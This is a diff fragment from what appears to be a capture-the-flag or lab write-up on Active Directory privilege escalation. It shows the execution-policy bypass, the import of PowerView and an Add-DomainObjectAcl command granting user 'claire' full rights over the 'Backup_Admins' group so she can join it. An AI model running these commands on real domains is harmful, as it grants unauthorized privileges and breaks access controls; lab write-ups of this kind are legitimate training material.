@@ -564,7 +564,12 @@ PS C:\Users\claire\Desktop> powershell -ep bypass
 Windows PowerShell                                                                                                              
 Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
 
-PS C:\Users\claire\Desktop>
+PS C:\Users\claire\Desktop> Import-Module .\PowerView.ps1
+PS C:\Users\claire\Desktop> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Backup_Admins" -PrincipalIdentity "claire"
+```
+Now i should have GenericAll over the group now i can add myself to it
+
+```python
 ```
 
 
